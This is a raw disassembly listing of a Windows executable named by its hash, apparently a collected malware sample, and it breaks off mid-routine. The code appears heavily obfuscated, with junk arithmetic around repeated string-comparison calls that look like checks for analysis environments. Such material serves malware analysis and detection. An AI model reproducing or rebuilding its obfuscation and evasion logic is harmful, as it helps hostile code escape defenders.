
695761ab3e0e95282681e7df7a00962b436ae3ff0f55599c03a8283defe79857.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x42d014,0x42a000
  401013:	push   esi
  401014:	movzx  esi,WORD PTR ds:0x429014
  40101b:	sub    DWORD PTR ds:0x42a018,esi
  401021:	mov    esi,DWORD PTR ds:0x42ed49
  401027:	push   0x8
  401029:	push   0x42e545
  40102e:	and    DWORD PTR ds:0x42c010,0x110f
  401038:	call   esi
  40103a:	test   eax,eax
  40103c:	mov    DWORD PTR ds:0x42a018,0x6e1c
  401046:	je     0x40105d
  40104c:	adc    DWORD PTR ds:0x42a014,0x429000
  401056:	xor    eax,eax
  401058:	jmp    0x4029a4
  40105d:	push   edi
  40105e:	push   0x42e555
  401063:	xor    edi,edi
  401065:	and    DWORD PTR ds:0x42c004,0x42d018
  40106f:	inc    edi
  401070:	push   edi
  401071:	push   edi
  401072:	call   DWORD PTR ds:0x42ed79
  401078:	xor    DWORD PTR ds:0x42d01c,0x429020
  401082:	test   eax,eax
  401084:	mov    DWORD PTR ds:0x42c004,0x42a7
  40108e:	je     0x4010a5
  401094:	xor    eax,eax
  401096:	mov    DWORD PTR ds:0x42a018,0x32e7
  4010a0:	jmp    0x4029a3
  4010a5:	sbb    DWORD PTR ds:0x42a010,0x2663
  4010af:	push   ebx
  4010b0:	and    DWORD PTR ds:0x42d008,0x0
  4010ba:	mov    ebx,DWORD PTR ds:0x42d008
  4010c0:	inc    ebx
  4010c1:	mov    DWORD PTR ds:0x42d008,ebx
  4010c7:	cmp    DWORD PTR ds:0x42d008,0xb
  4010ce:	jne    0x4010e4
  4010d4:	push   0x2cfb
  4010d9:	push   0x7de9
  4010de:	call   DWORD PTR ds:0x42ed35
  4010e4:	cmp    DWORD PTR ds:0x42d008,0xa
  4010eb:	jne    0x4010fe
  4010f1:	mov    ebx,DWORD PTR ds:0x42d008
  4010f7:	inc    ebx
  4010f8:	mov    DWORD PTR ds:0x42d008,ebx
  4010fe:	cmp    DWORD PTR ds:0x42d008,0x12
  401105:	jb     0x4010ba
  40110b:	mov    ebx,DWORD PTR ds:0x42ed4d
  401111:	push   0x42e565
  401116:	sub    DWORD PTR ds:0x429014,0x429020
  401120:	push   edi
  401121:	mov    DWORD PTR ds:0x42b01c,0x3048
  40112b:	push   edi
  40112c:	call   ebx
  40112e:	and    DWORD PTR ds:0x42c00c,0x5ead
  401138:	test   eax,eax
  40113a:	jne    0x401e1f
  401140:	push   0xc
  401142:	push   0x42e589
  401147:	adc    DWORD PTR ds:0x42c010,0x42d010
  401151:	call   esi
  401153:	test   eax,eax
  401155:	mov    DWORD PTR ds:0x42a01c,0x6b4c
  40115f:	jne    0x401e1f
  401165:	push   0x7
  401167:	push   0x42e59d
  40116c:	call   esi
  40116e:	xor    DWORD PTR ds:0x429028,0x6216
  401178:	test   eax,eax
  40117a:	jne    0x401e1f
  401180:	add    DWORD PTR ds:0x429004,0x14dc
  40118a:	push   0x8
  40118c:	and    DWORD PTR ds:0x42c00c,0x42a000
  401196:	push   0x42e5ad
  40119b:	add    DWORD PTR ds:0x42a018,0x317f
  4011a5:	call   esi
  4011a7:	test   eax,eax
  4011a9:	mov    DWORD PTR ds:0x42c014,0x304b
  4011b3:	jne    0x401e1f
  4011b9:	push   0x42e5bd
  4011be:	xor    DWORD PTR ds:0x42d014,0x42b004
  4011c8:	push   edi
  4011c9:	push   edi
  4011ca:	sub    DWORD PTR ds:0x429010,0x429028
  4011d4:	call   DWORD PTR ds:0x42ed79
  4011da:	not    DWORD PTR ds:0x42b000
  4011e0:	test   eax,eax
  4011e2:	mov    DWORD PTR ds:0x429008,0x4a9f
  4011ec:	jne    0x401e1f
  4011f2:	push   0x42e5cd
  4011f7:	push   edi
  4011f8:	adc    DWORD PTR ds:0x42d000,0x42900c
  401202:	push   edi
  401203:	call   ebx
  401205:	test   eax,eax
  401207:	jne    0x401e1f
  40120d:	xor    DWORD PTR ds:0x429000,0x429010
  401217:	push   0xc
  401219:	and    DWORD PTR ds:0x42b00c,0x6767
  401223:	push   0x42e5f1
  401228:	sub    DWORD PTR ds:0x42a010,0x429018
  401232:	call   esi
  401234:	sub    DWORD PTR ds:0x429010,0x42a010
  40123e:	test   eax,eax
  401240:	jne    0x401e1f
  401246:	push   0x7
  401248:	push   0x42e605
  40124d:	and    DWORD PTR ds:0x42c004,0x42b014
  401257:	call   esi
  401259:	test   eax,eax
  40125b:	mov    DWORD PTR ds:0x42c014,0x7e03
  401265:	jne    0x401e1f
  40126b:	and    DWORD PTR ds:0x429020,0x42d000
  401275:	push   0x8
  401277:	sbb    DWORD PTR ds:0x42a008,0x42901c
  401281:	push   0x42e615
  401286:	add    DWORD PTR ds:0x42c01c,0x42d010
  401290:	call   esi
  401292:	test   eax,eax
  401294:	mov    DWORD PTR ds:0x429008,0x7503
  40129e:	jne    0x401e1f
  4012a4:	push   0x42e625
  4012a9:	and    DWORD PTR ds:0x42d008,0x42c000
  4012b3:	push   edi
  4012b4:	push   edi
  4012b5:	call   DWORD PTR ds:0x42ed79
  4012bb:	or     DWORD PTR ds:0x42c01c,0x42d000
  4012c5:	test   eax,eax
  4012c7:	jne    0x401e1f
  4012cd:	add    DWORD PTR ds:0x42b018,0x42d004
  4012d7:	push   0x42e635
  4012dc:	and    DWORD PTR ds:0x42900c,0x42a018
  4012e6:	push   edi
  4012e7:	push   edi
  4012e8:	and    DWORD PTR ds:0x42c018,0x4f5c
  4012f2:	call   ebx
  4012f4:	xor    DWORD PTR ds:0x42b00c,0x577f
  4012fe:	test   eax,eax
  401300:	jne    0x401e1f
  401306:	push   0xc
  401308:	push   0x42e659
  40130d:	xor    DWORD PTR ds:0x429018,0x2dc5
  401317:	call   esi
  401319:	mov    DWORD PTR ds:0x42d014,0x790c
  401323:	test   eax,eax
  401325:	mov    DWORD PTR ds:0x42a014,0x2892
  40132f:	jne    0x401e1f
  401335:	sub    DWORD PTR ds:0x42d004,0x3ee1
  40133f:	push   0x7
  401341:	xor    DWORD PTR ds:0x42a01c,0x42b018
  40134b:	push   0x42e66d
  401350:	and    DWORD PTR ds:0x42c018,0x42d014
  40135a:	call   esi
  40135c:	test   eax,eax
  40135e:	mov    DWORD PTR ds:0x429008,0x4095
  401368:	jne    0x401e1f
  40136e:	sub    DWORD PTR ds:0x42d008,0x42b000
  401378:	push   0x8
  40137a:	adc    DWORD PTR ds:0x42d018,0x42c00c
  401384:	push   0x42e67d
  401389:	xor    DWORD PTR ds:0x42c014,0x7b1e
  401393:	call   esi
  401395:	test   eax,eax
  401397:	mov    DWORD PTR ds:0x42c010,0x4421
  4013a1:	jne    0x401e1f
  4013a7:	push   0x42e68d
  4013ac:	xor    DWORD PTR ds:0x42d018,0x31e9
  4013b6:	push   edi
  4013b7:	push   edi
  4013b8:	dec    DWORD PTR ds:0x42b010
  4013be:	call   DWORD PTR ds:0x42ed79
  4013c4:	test   eax,eax
  4013c6:	mov    DWORD PTR ds:0x429008,0x30d5
  4013d0:	jne    0x401e1f
  4013d6:	push   0x42e69d
  4013db:	push   edi
  4013dc:	adc    DWORD PTR ds:0x42c018,0x42d014
  4013e6:	push   edi
  4013e7:	sbb    DWORD PTR ds:0x429024,0x42b00c
  4013f1:	call   ebx
  4013f3:	xor    DWORD PTR ds:0x42b004,0x3165
  4013fd:	test   eax,eax
  4013ff:	mov    DWORD PTR ds:0x429028,0x3c76
  401409:	jne    0x401e1f
  40140f:	push   0xc
  401411:	or     DWORD PTR ds:0x42d000,0x42c004
  40141b:	push   0x42e6c1
  401420:	call   esi
  401422:	test   eax,eax
  401424:	mov    DWORD PTR ds:0x42d01c,0x6bbc
  40142e:	jne    0x401e1f
  401434:	and    DWORD PTR ds:0x42c018,0x24ff
  40143e:	push   0x7
  401440:	push   0x42e6d5
  401445:	add    DWORD PTR ds:0x42c008,0x429024
  40144f:	call   esi
  401451:	adc    DWORD PTR ds:0x429008,0x42b004
  40145b:	test   eax,eax
  40145d:	jne    0x401e1f
  401463:	push   0x8
  401465:	push   0x42e6e5
  40146a:	or     DWORD PTR ds:0x42a00c,0x2f15
  401474:	call   esi
  401476:	test   eax,eax
  401478:	jne    0x401e1f
  40147e:	push   0x42e6f5
  401483:	push   edi
  401484:	add    DWORD PTR ds:0x42a008,0x52fe
  40148e:	push   edi
  40148f:	call   DWORD PTR ds:0x42ed79
  401495:	sub    DWORD PTR ds:0x429018,0x42c010
  40149f:	test   eax,eax
  4014a1:	mov    DWORD PTR ds:0x42d014,0x5fc2
  4014ab:	jne    0x401e1f
  4014b1:	push   0x42e705
  4014b6:	add    DWORD PTR ds:0x42b014,0x42a00c
  4014c0:	push   edi
  4014c1:	push   edi
  4014c2:	xor    DWORD PTR ds:0x42b00c,0x37e4
  4014cc:	call   ebx
  4014ce:	mov    DWORD PTR ds:0x429000,0x2bcb
  4014d8:	test   eax,eax
  4014da:	jne    0x401e1f
  4014e0:	push   0xc
  4014e2:	push   0x42e729
  4014e7:	call   esi
  4014e9:	and    DWORD PTR ds:0x42b000,0x6be4
  4014f3:	test   eax,eax
  4014f5:	mov    DWORD PTR ds:0x42b00c,0x4954
  4014ff:	jne    0x401e1f
  401505:	or     DWORD PTR ds:0x429004,0x2e1b
  40150f:	push   0x7
  401511:	push   0x42e73d
  401516:	neg    DWORD PTR ds:0x429018
  40151c:	call   esi
  40151e:	or     DWORD PTR ds:0x429004,0x7cc8
  401528:	test   eax,eax
  40152a:	mov    DWORD PTR ds:0x42a000,0x4af4
  401534:	jne    0x401e1f
  40153a:	sub    DWORD PTR ds:0x429020,0x6067
  401544:	push   0x8
  401546:	push   0x42e74d
  40154b:	call   esi
  40154d:	test   eax,eax
  40154f:	jne    0x401e1f
  401555:	xor    DWORD PTR ds:0x429008,0x42a00c
  40155f:	push   0x42e75d
  401564:	push   edi
  401565:	sbb    DWORD PTR ds:0x42a004,0x429028
  40156f:	push   edi
  401570:	adc    DWORD PTR ds:0x42c000,0x42b004
  40157a:	call   DWORD PTR ds:0x42ed79
  401580:	xor    DWORD PTR ds:0x42b01c,0x42d004
  40158a:	test   eax,eax
  40158c:	mov    DWORD PTR ds:0x429004,0x6f0c
  401596:	jne    0x401e1f
  40159c:	sbb    DWORD PTR ds:0x429010,0x42b010
  4015a6:	push   0x42e76d
  4015ab:	push   edi
  4015ac:	xor    DWORD PTR ds:0x42c000,0x17e1
  4015b6:	push   edi
  4015b7:	add    DWORD PTR ds:0x429024,0x42b018
  4015c1:	call   ebx
  4015c3:	sbb    DWORD PTR ds:0x42c004,0x42b018
  4015cd:	test   eax,eax
  4015cf:	jne    0x401e1f
  4015d5:	or     DWORD PTR ds:0x42d008,0x42d000
  4015df:	push   0xc
  4015e1:	push   0x42e791
  4015e6:	adc    DWORD PTR ds:0x42d01c,0x429000
  4015f0:	call   esi
  4015f2:	test   eax,eax
  4015f4:	jne    0x401e1f
  4015fa:	sbb    DWORD PTR ds:0x42b01c,0x35f4
  401604:	push   0x7
  401606:	adc    DWORD PTR ds:0x42d00c,0x4213
  401610:	push   0x42e7a5
  401615:	xor    DWORD PTR ds:0x42b01c,0x728b
  40161f:	call   esi
  401621:	test   eax,eax
  401623:	mov    DWORD PTR ds:0x429010,0x1355
  40162d:	jne    0x401e1f
  401633:	add    DWORD PTR ds:0x42c00c,0x42d000
  40163d:	push   0x8
  40163f:	sub    DWORD PTR ds:0x42d000,0x42a014
  401649:	push   0x42e7b5
  40164e:	xor    DWORD PTR ds:0x42900c,0x42a014
  401658:	call   esi
  40165a:	add    DWORD PTR ds:0x42d018,0x7270
  401664:	test   eax,eax
  401666:	jne    0x401e1f
  40166c:	xor    DWORD PTR ds:0x429028,0x318
  401676:	push   0x42e7c5
  40167b:	not    DWORD PTR ds:0x42b00c
  401681:	push   edi
  401682:	and    DWORD PTR ds:0x429024,0x42d004
  40168c:	push   edi
  40168d:	call   DWORD PTR ds:0x42ed79
  401693:	test   eax,eax
  401695:	jne    0x401e1f
  40169b:	push   0x42e7d5
  4016a0:	push   edi
  4016a1:	push   edi
  4016a2:	xor    DWORD PTR ds:0x42d004,0x42b004
  4016ac:	call   ebx
  4016ae:	sbb    DWORD PTR ds:0x42d01c,0x42a008
  4016b8:	test   eax,eax
  4016ba:	mov    DWORD PTR ds:0x42b008,0x59c6
  4016c4:	jne    0x401e1f
  4016ca:	mov    DWORD PTR ds:0x42a008,0x78fc
  4016d4:	push   0xc
  4016d6:	add    DWORD PTR ds:0x42900c,0x42c018
  4016e0:	push   0x42e7f9
  4016e5:	call   esi
  4016e7:	test   eax,eax
  4016e9:	jne    0x401e1f
  4016ef:	and    DWORD PTR ds:0x42d010,0x3029
  4016f9:	push   0x7
  4016fb:	xor    DWORD PTR ds:0x42d008,0x429020
  401705:	push   0x42e80d
  40170a:	call   esi
  40170c:	sub    DWORD PTR ds:0x42901c,0x49cd
  401716:	test   eax,eax
  401718:	mov    DWORD PTR ds:0x42900c,0x2477
  401722:	jne    0x401e1f
  401728:	push   0x8
  40172a:	push   0x42e81d
  40172f:	call   esi
  401731:	or     DWORD PTR ds:0x42c000,0x42b014
  40173b:	test   eax,eax
  40173d:	jne    0x401e1f
  401743:	sub    DWORD PTR ds:0x429018,0x4202
  40174d:	push   0x42e82d
  401752:	adc    DWORD PTR ds:0x42a000,0x15e
  40175c:	push   edi
  40175d:	push   edi
  40175e:	and    DWORD PTR ds:0x42d008,0x1b79
  401768:	call   DWORD PTR ds:0x42ed79
  40176e:	add    DWORD PTR ds:0x42b008,0x42c000
  401778:	test   eax,eax
  40177a:	mov    DWORD PTR ds:0x429004,0x4fab
  401784:	jne    0x401e1f
  40178a:	add    DWORD PTR ds:0x42b008,0x429018
  401794:	push   0x42e83d
  401799:	push   edi
  40179a:	adc    DWORD PTR ds:0x42d018,0x42b008
  4017a4:	push   edi
  4017a5:	call   ebx
  4017a7:	adc    DWORD PTR ds:0x42b01c,0x42a014
  4017b1:	test   eax,eax
  4017b3:	mov    DWORD PTR ds:0x42b008,0x413c
  4017bd:	jne    0x401e1f
  4017c3:	sub    DWORD PTR ds:0x42a004,0x429004
  4017cd:	push   0xc
  4017cf:	push   0x42e861
  4017d4:	sub    DWORD PTR ds:0x42b014,0x419d
  4017de:	call   esi
  4017e0:	sub    DWORD PTR ds:0x429014,0x429024
  4017ea:	test   eax,eax
  4017ec:	mov    DWORD PTR ds:0x42c018,0x3584
  4017f6:	jne    0x401e1f
  4017fc:	adc    DWORD PTR ds:0x42b014,0x3845
  401806:	push   0x7
  401808:	adc    DWORD PTR ds:0x42b014,0x5918
  401812:	push   0x42e875
  401817:	call   esi
  401819:	or     DWORD PTR ds:0x42b004,0x42a000
  401823:	test   eax,eax
  401825:	jne    0x401e1f
  40182b:	sub    DWORD PTR ds:0x42c010,0x7a9b
  401835:	push   0x8
  401837:	push   0x42e885
  40183c:	call   esi
  40183e:	or     DWORD PTR ds:0x42b018,0x42a018
  401848:	test   eax,eax
  40184a:	mov    DWORD PTR ds:0x42c018,0x6db6
  401854:	jne    0x401e1f
  40185a:	push   0x42e895
  40185f:	push   edi
  401860:	push   edi
  401861:	or     DWORD PTR ds:0x429024,0x42b004
  40186b:	call   DWORD PTR ds:0x42ed79
  401871:	test   eax,eax
  401873:	jne    0x401e1f
  401879:	push   0x42e8a5
  40187e:	mov    DWORD PTR ds:0x42d010,0x708e
  401888:	push   edi
  401889:	mov    DWORD PTR ds:0x42c01c,0x7ef
  401893:	push   edi
  401894:	call   ebx
  401896:	test   eax,eax
  401898:	mov    DWORD PTR ds:0x42a00c,0x3b87
  4018a2:	jne    0x401e1f
  4018a8:	mov    DWORD PTR ds:0x429004,0x503
  4018b2:	push   0xc
  4018b4:	xor    DWORD PTR ds:0x42c00c,0x6b3b
  4018be:	push   0x42e8c9
  4018c3:	call   esi
  4018c5:	test   eax,eax
  4018c7:	mov    DWORD PTR ds:0x42a004,0x812
  4018d1:	jne    0x401e1f
  4018d7:	push   0x7
  4018d9:	sub    DWORD PTR ds:0x42b000,0x42a00c
  4018e3:	push   0x42e8dd
  4018e8:	sub    DWORD PTR ds:0x42d008,0x6a91
  4018f2:	call   esi
  4018f4:	add    DWORD PTR ds:0x429000,0x3ce6
  4018fe:	test   eax,eax
  401900:	mov    DWORD PTR ds:0x42d018,0x1a2
  40190a:	jne    0x401e1f
  401910:	sub    DWORD PTR ds:0x42a008,0x42a010
  40191a:	push   0x8
  40191c:	push   0x42e8ed
  401921:	call   esi
  401923:	sub    DWORD PTR ds:0x42d00c,0x42900c
  40192d:	test   eax,eax
  40192f:	mov    DWORD PTR ds:0x429000,0x18ec
  401939:	jne    0x401e1f
  40193f:	sbb    DWORD PTR ds:0x42a01c,0x42a004
  401949:	push   0x42e8fd
  40194e:	adc    DWORD PTR ds:0x42c010,0x1027
  401958:	push   edi
  401959:	adc    DWORD PTR ds:0x42d014,0x61c0
  401963:	push   edi
  401964:	xor    DWORD PTR ds:0x42d004,0x42b000
  40196e:	call   DWORD PTR ds:0x42ed79
  401974:	and    DWORD PTR ds:0x42b00c,0x54e0
  40197e:	test   eax,eax
  401980:	jne    0x401e1f
  401986:	mov    DWORD PTR ds:0x42b014,0x48d
  401990:	push   0x42e90d
  401995:	xor    DWORD PTR ds:0x42b00c,0x429000
  40199f:	push   edi
  4019a0:	xor    DWORD PTR ds:0x42c008,0x7d0d
  4019aa:	push   edi
  4019ab:	and    DWORD PTR ds:0x42b010,0xad4
  4019b5:	call   ebx
  4019b7:	adc    DWORD PTR ds:0x42b01c,0x42d018
  4019c1:	test   eax,eax
  4019c3:	mov    DWORD PTR ds:0x42a00c,0x2f29
  4019cd:	jne    0x401e1f
  4019d3:	sub    DWORD PTR ds:0x42a010,0x429014
  4019dd:	push   0xc
  4019df:	add    DWORD PTR ds:0x42d004,0x38f3
  4019e9:	push   0x42e931
  4019ee:	sub    DWORD PTR ds:0x42d008,0x531f
  4019f8:	call   esi
  4019fa:	xor    DWORD PTR ds:0x42a00c,0x1332
  401a04:	test   eax,eax
  401a06:	jne    0x401e1f
  401a0c:	add    DWORD PTR ds:0x42d014,0x42b000
  401a16:	push   0x7
  401a18:	push   0x42e945
  401a1d:	adc    DWORD PTR ds:0x429028,0x23cf
  401a27:	call   esi
  401a29:	test   eax,eax
  401a2b:	jne    0x401e1f
  401a31:	push   0x8
  401a33:	add    DWORD PTR ds:0x429020,0x607a
  401a3d:	push   0x42e955
  401a42:	call   esi
  401a44:	or     DWORD PTR ds:0x42c000,0x42b00c
  401a4e:	test   eax,eax
  401a50:	mov    DWORD PTR ds:0x42c00c,0x4ca0
  401a5a:	jne    0x401e1f
  401a60:	sub    DWORD PTR ds:0x429000,0x42d010
  401a6a:	push   0x42e965
  401a6f:	push   edi
  401a70:	and    DWORD PTR ds:0x42901c,0x42a004
  401a7a:	push   edi
  401a7b:	xor    DWORD PTR ds:0x42b018,0x42a008
  401a85:	call   DWORD PTR ds:0x42ed79
  401a8b:	adc    DWORD PTR ds:0x42d004,0x42901c
  401a95:	test   eax,eax
  401a97:	mov    DWORD PTR ds:0x42c010,0x64f7
  401aa1:	jne    0x401e1f
  401aa7:	push   0x42e975
  401aac:	mov    DWORD PTR ds:0x42a014,0x62f7
  401ab6:	push   edi
  401ab7:	push   edi
  401ab8:	call   ebx
  401aba:	add    DWORD PTR ds:0x42a018,0x42d01c
  401ac4:	test   eax,eax
  401ac6:	mov    DWORD PTR ds:0x42c01c,0x72ca
  401ad0:	jne    0x401e1f
  401ad6:	mov    DWORD PTR ds:0x42c01c,0x7760
  401ae0:	push   0xc
  401ae2:	sub    DWORD PTR ds:0x42b018,0x3ed8
  401aec:	push   0x42e999
  401af1:	call   esi
  401af3:	test   eax,eax
  401af5:	mov    DWORD PTR ds:0x42d018,0x4329
  401aff:	jne    0x401e1f
  401b05:	push   0x7
  401b07:	push   0x42e9ad
  401b0c:	call   esi
  401b0e:	add    DWORD PTR ds:0x42b01c,0x42d008
  401b18:	test   eax,eax
  401b1a:	jne    0x401e1f
  401b20:	add    DWORD PTR ds:0x42a008,0x5e0b
  401b2a:	push   0x8
  401b2c:	sub    DWORD PTR ds:0x429018,0x42a00c
  401b36:	push   0x42e9bd
  401b3b:	call   esi
  401b3d:	test   eax,eax
  401b3f:	mov    DWORD PTR ds:0x42d008,0x514f
  401b49:	jne    0x401e1f
  401b4f:	sbb    DWORD PTR ds:0x42b000,0x42d000
  401b59:	push   0x42e9cd
  401b5e:	xor    DWORD PTR ds:0x42c018,0x40e4
  401b68:	push   edi
  401b69:	add    DWORD PTR ds:0x42b010,0x42c000
  401b73:	push   edi
  401b74:	add    DWORD PTR ds:0x42d004,0x42c010
  401b7e:	call   DWORD PTR ds:0x42ed79
  401b84:	mov    DWORD PTR ds:0x42a000,0x51c5
  401b8e:	test   eax,eax
  401b90:	mov    DWORD PTR ds:0x42b000,0x17c8
  401b9a:	jne    0x401e1f
  401ba0:	and    DWORD PTR ds:0x42d014,0x42d010
  401baa:	push   0x42e9dd
  401baf:	push   edi
  401bb0:	push   edi
  401bb1:	call   ebx
  401bb3:	sbb    DWORD PTR ds:0x429010,0x42b014
  401bbd:	test   eax,eax
  401bbf:	mov    DWORD PTR ds:0x42c01c,0x73a3
  401bc9:	jne    0x401e1f
  401bcf:	xor    DWORD PTR ds:0x42c01c,0x6e0
  401bd9:	push   0xc
  401bdb:	adc    DWORD PTR ds:0x429008,0x42c008
  401be5:	push   0x42ea01
  401bea:	adc    DWORD PTR ds:0x42901c,0x2688
  401bf4:	call   esi
  401bf6:	add    DWORD PTR ds:0x42c008,0x63eb
  401c00:	test   eax,eax
  401c02:	mov    DWORD PTR ds:0x429004,0x7742
  401c0c:	jne    0x401e1f
  401c12:	adc    DWORD PTR ds:0x42c014,0x42b008
  401c1c:	push   0x7
  401c1e:	adc    DWORD PTR ds:0x42c008,0x42b010
  401c28:	push   0x42ea15
  401c2d:	call   esi
  401c2f:	test   eax,eax
  401c31:	mov    DWORD PTR ds:0x42900c,0x5c79
  401c3b:	jne    0x401e1f
  401c41:	adc    DWORD PTR ds:0x42d008,0x429000
  401c4b:	push   0x8
  401c4d:	xor    DWORD PTR ds:0x42c008,0x42b014
  401c57:	push   0x42ea25
  401c5c:	sub    DWORD PTR ds:0x42d000,0x42b01c
  401c66:	call   esi
  401c68:	xor    DWORD PTR ds:0x429008,0x42a00c
  401c72:	test   eax,eax
  401c74:	jne    0x401e1f
  401c7a:	push   0x42ea35
  401c7f:	adc    DWORD PTR ds:0x429020,0x1586
  401c89:	push   edi
  401c8a:	push   edi
  401c8b:	and    DWORD PTR ds:0x429008,0x42a014
  401c95:	call   DWORD PTR ds:0x42ed79
  401c9b:	and    DWORD PTR ds:0x42a01c,0x429000
  401ca5:	test   eax,eax
  401ca7:	jne    0x401e1f
  401cad:	push   0x42ea45
  401cb2:	push   edi
  401cb3:	sub    DWORD PTR ds:0x42d000,0x429000
  401cbd:	push   edi
  401cbe:	call   ebx
  401cc0:	test   eax,eax
  401cc2:	jne    0x401e1f
  401cc8:	push   0xc
  401cca:	push   0x42ea69
  401ccf:	sbb    DWORD PTR ds:0x42a004,0x42a014
  401cd9:	call   esi
  401cdb:	test   eax,eax
  401cdd:	mov    DWORD PTR ds:0x42a018,0x57a5
  401ce7:	jne    0x401e1f
  401ced:	sub    DWORD PTR ds:0x42d018,0x45f
  401cf7:	push   0x7
  401cf9:	push   0x42ea7d
  401cfe:	call   esi
  401d00:	test   eax,eax
  401d02:	mov    DWORD PTR ds:0x42a010,0x77f7
  401d0c:	jne    0x401e1f
  401d12:	adc    DWORD PTR ds:0x42a008,0x42900c
  401d1c:	push   0x8
  401d1e:	sub    DWORD PTR ds:0x429008,0x429014
  401d28:	push   0x42ea8d
  401d2d:	and    DWORD PTR ds:0x429008,0x429018
  401d37:	call   esi
  401d39:	test   eax,eax
  401d3b:	mov    DWORD PTR ds:0x429000,0x2cbb
  401d45:	jne    0x401e1f
  401d4b:	and    DWORD PTR ds:0x42d01c,0x42b000
  401d55:	push   0x42ea9d
  401d5a:	or     DWORD PTR ds:0x42b010,0x58c8
  401d64:	push   edi
  401d65:	or     DWORD PTR ds:0x42c00c,0x42a00c
  401d6f:	push   edi
  401d70:	adc    DWORD PTR ds:0x42b004,0x42a01c
  401d7a:	call   DWORD PTR ds:0x42ed79
  401d80:	and    DWORD PTR ds:0x429020,0x42b000
  401d8a:	test   eax,eax
  401d8c:	jne    0x401e1f
  401d92:	or     DWORD PTR ds:0x42c01c,0x42b01c
  401d9c:	push   0x42eaad
  401da1:	push   edi
  401da2:	push   edi
  401da3:	call   ebx
  401da5:	sbb    DWORD PTR ds:0x42901c,0x42c01c
  401daf:	test   eax,eax
  401db1:	mov    DWORD PTR ds:0x429018,0x129d
  401dbb:	jne    0x401e1f
  401dc1:	sbb    DWORD PTR ds:0x42a004,0x14a1
  401dcb:	push   0xc
  401dcd:	push   0x42ead1
  401dd2:	call   esi
  401dd4:	sbb    DWORD PTR ds:0x42c00c,0x67e3
  401dde:	test   eax,eax
  401de0:	mov    DWORD PTR ds:0x42c014,0x5d4a
  401dea:	jne    0x401e1f
  401df0:	sbb    DWORD PTR ds:0x42c00c,0x7769
  401dfa:	push   0x7
  401dfc:	or     DWORD PTR ds:0x42b00c,0x1035
  401e06:	push   0x42eae5
  401e0b:	call   esi
  401e0d:	test   eax,eax
  401e0f:	mov    DWORD PTR ds:0x42d014,0xf4
  401e19:	je     0x401e3a
  401e1f:	sub    DWORD PTR ds:0x42b01c,0x42b000
  401e29:	xor    eax,eax
  401e2b:	mov    DWORD PTR ds:0x42c018,0x7f86
  401e35:	jmp    0x4029a2
  401e3a:	or     esi,DWORD PTR ds:0x429020
  401e40:	mov    DWORD PTR [ebp-0x10],0x0
  401e47:	movzx  esi,BYTE PTR ds:0x42d010
  401e4e:	add    DWORD PTR ds:0x42c004,esi
  401e54:	mov    eax,DWORD PTR [ebp-0x24]
  401e57:	dec    esi
  401e58:	mov    DWORD PTR [ebp-0x24],eax
  401e5b:	mov    ecx,0xf89c85b5
  401e60:	mov    edi,DWORD PTR ds:0x411fc4
  401e66:	mov    esi,DWORD PTR ds:0x411f58
  401e6c:	sub    esi,edi
  401e6e:	imul   edi,DWORD PTR [edi+esi*1]
  401e72:	mov    DWORD PTR [ebp-0x8],ecx
  401e75:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  401e7c:	and    DWORD PTR ds:0x42a004,0x0
  401e86:	jmp    0x401e98
  401e8b:	mov    edi,DWORD PTR ds:0x42a004
  401e91:	inc    edi
  401e92:	mov    DWORD PTR ds:0x42a004,edi
  401e98:	cmp    DWORD PTR ds:0x42a004,0x1c
  401e9f:	jae    0x401ed2
  401ea5:	cmp    DWORD PTR ds:0x42a004,0x25
  401eac:	jne    0x401ec3
  401eb2:	push   DWORD PTR [ebp-0x14]
  401eb5:	push   0x42a004
  401eba:	push   DWORD PTR [ebp-0x1c]
  401ebd:	call   DWORD PTR ds:0x42ed39
  401ec3:	jmp    0x401e8b
  401ec8:	sbb    DWORD PTR ds:0x42d000,0x3f97
  401ed2:	lea    eax,[ebp-0x34]
  401ed5:	mov    DWORD PTR [ebp-0x28],eax
  401ed8:	mov    esi,DWORD PTR ds:0x429018
  401ede:	and    esi,DWORD PTR ds:0x42901c
  401ee4:	mov    DWORD PTR ds:0x429018,esi
  401eea:	lea    eax,[ebp-0x30]
  401eed:	mov    DWORD PTR [ebp-0x1c],eax
  401ef0:	sub    DWORD PTR ds:0x429018,0x2a07
  401efa:	mov    eax,ds:0x42e435
  401eff:	mov    eax,DWORD PTR [eax+0x1c8]
  401f05:	or     DWORD PTR ds:0x429028,0x42b010
  401f0f:	mov    eax,DWORD PTR [eax]
  401f11:	mov    edx,DWORD PTR [ebp-0x1c]
  401f14:	mov    esi,0x7510896
  401f19:	adc    DWORD PTR ds:0x429014,edi
  401f1f:	xor    eax,esi
  401f21:	mov    edi,0x3272dd
  401f26:	add    eax,edi
  401f28:	mov    DWORD PTR ds:0x42d008,0xdc
  401f32:	mov    DWORD PTR [edx],eax
  401f34:	mov    eax,ds:0x42b000
  401f39:	mov    eax,ds:0x42ebcd
  401f3e:	cmp    eax,0x312bc9f6
  401f43:	jne    0x40206d
  401f49:	xor    eax,0x6ec6
  401f4e:	mov    eax,DWORD PTR [ebp-0x8]
  401f51:	mov    edx,DWORD PTR ds:0x42e435
  401f57:	or     DWORD PTR ds:0x42901c,0x3e24
  401f61:	mov    edx,DWORD PTR [edx+0x198]
  401f67:	or     DWORD PTR ds:0x42b018,edx
  401f6d:	xor    eax,esi
  401f6f:	and    ebx,0x7b5c
  401f75:	add    eax,edi
  401f77:	and    DWORD PTR ds:0x429028,0x0
  401f81:	jmp    0x401f93
  401f86:	mov    ebx,DWORD PTR ds:0x429028
  401f8c:	inc    ebx
  401f8d:	mov    DWORD PTR ds:0x429028,ebx
  401f93:	cmp    DWORD PTR ds:0x429028,0x10
  401f9a:	jae    0x401fc8
  401fa0:	cmp    DWORD PTR ds:0x429028,0x12
  401fa7:	jne    0x401fbd
  401fad:	push   0x42e010
  401fb2:	push   0x42e0c5
  401fb7:	call   DWORD PTR ds:0x42ed3d
  401fbd:	jmp    0x401f86
  401fc2:	sub    DWORD PTR ds:0x42c014,edx
  401fc8:	mov    DWORD PTR [edx],eax
  401fca:	sbb    DWORD PTR ds:0x42c014,edi
  401fd0:	mov    eax,DWORD PTR [ebp-0x8]
  401fd3:	mov    DWORD PTR ds:0x42c018,0x1d
  401fdd:	cmp    DWORD PTR ds:0x42c018,0x0
  401fe4:	je     0x402064
  401fea:	cmp    DWORD PTR ds:0x42c018,0x26
